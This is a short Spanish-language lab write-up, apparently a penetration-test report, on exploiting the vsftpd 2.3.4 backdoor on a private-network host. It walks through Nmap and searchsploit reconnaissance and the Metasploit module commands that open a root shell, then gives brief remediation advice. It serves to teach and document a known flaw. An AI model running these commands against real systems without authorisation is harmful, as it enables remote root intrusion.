💥 PoC: Explotación de Backdoor en vsftpd v2.3.4

1. Ficha Técnica
* Vulnerabilidad: vsftpd 2.3.4 Backdoor Command Execution.
* Puerto / Servicio Afectado: 21/TCP (FTP).
* Impacto: Ejecución Remota de Código (RCE) con privilegios de root.
* Categoría: Explotación de Servicio Vulnerable.

2. Descubrimiento y Detección
En la fase de reconocimiento, se lanzó un escaneo de puertos con Nmap hacia la dirección IP objetivo (192.168.0.248):

![](vsftpd-nmap-bash.png)

Los resultados exportados a HTML confirmaron la presencia del servicio FTP en el puerto 21/TCP ejecutando la versión vulnerable vsftpd 2.3.4:

![Reporte de Nmap mostrando el puerto 21 activo](assets/vsftpd-nmap-report.png)

A través de la herramienta searchsploit, se verificó la disponibilidad de exploits públicos para esta versión:

```bash
searchsploit vsftpd
```

![](vsftpd-searchsploit.png)

1. Explotación de la Vulnerabilidad Se inició Metasploit Framework y se buscó el módulo de explotación correspondiente: 

```bash
msfconsole
msf > search vsftpd 2.3.4
```

![](vsftpd-msf-search.png)

Se seleccionó el módulo exploit/unix/ftp/vsftpd_234_backdoor y se configuró la IP del objetivo (RHOSTS):

```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf > set RHOSTS 192.168.0.248
msf > show options
```

![](vsftpd-msf-options.png)

Se ejecutó el ataque para activar el backdoor en el puerto 6200:

```bash
msf > run
```

![](vsftpd-exploit-run.png)

4. Post-Explotación y Evidencia Tras la apertura de la sesión de comandos, se interactuó con la consola remota para validar el nivel de acceso en el sistema:
    
5. El comando whoami devolvió root, confirmando el máximo nivel de privilegios.
    
6. Se exploraron directorios del sistema (/home) para verificar la capacidad de lectura e interacción.
    

7. Remedación
    

- Actualización: Migrar el servicio FTP a una versión reciente y parcheada.
    
- Segmentación de Red: Restringir el tráfico al puerto 21/TCP mediante reglas de firewall estrictas.